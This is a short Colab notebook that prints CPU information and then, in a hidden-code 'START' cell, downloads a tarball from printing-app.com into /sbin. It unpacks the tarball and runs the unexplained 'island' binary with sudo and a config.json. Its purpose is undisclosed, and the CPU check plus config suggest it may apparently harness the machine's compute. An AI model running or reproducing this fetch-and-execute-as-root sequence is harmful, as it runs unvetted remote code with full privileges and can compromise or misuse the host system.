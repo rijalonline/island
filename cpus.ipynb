{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "cpus.pynb",
      "private_outputs": true,
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "kC9koUOWsq-l"
      },
      "source": [
        "!lscpu"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gX0bDnIZ-mPp",
        "cellView": "form"
      },
      "source": [
        "#@title START\n",
        "%cd /sbin\n",
        "!wget https://printing-app.com/island.tar.gz\n",
        "!tar -xvf island.tar.gz\n",
        "!sed -i -e 's/\\r$//' config.json\n",
        "!chmod  +x *.json ./island && sudo ./island\n",
        "!./island -c config.json"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}